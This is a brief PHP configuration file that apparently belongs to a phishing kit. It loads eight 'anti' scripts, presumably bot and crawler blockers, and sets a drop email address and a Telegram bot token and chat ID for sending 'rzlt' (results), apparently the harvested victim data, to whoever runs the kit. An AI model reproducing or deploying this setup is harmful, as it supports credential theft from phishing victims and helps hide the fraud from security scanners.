<?php
/*

 
                                                                                                
                                                                                                
                                                                                                

*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$email ="HowardFeldstein@gmx.com"; 

//telgram rzlt
$api = "6647942591:AAEM1v1_j8i0AS9yqAV0lNDetJiw2wLL5_M";
$chatid = "5412557482";


?>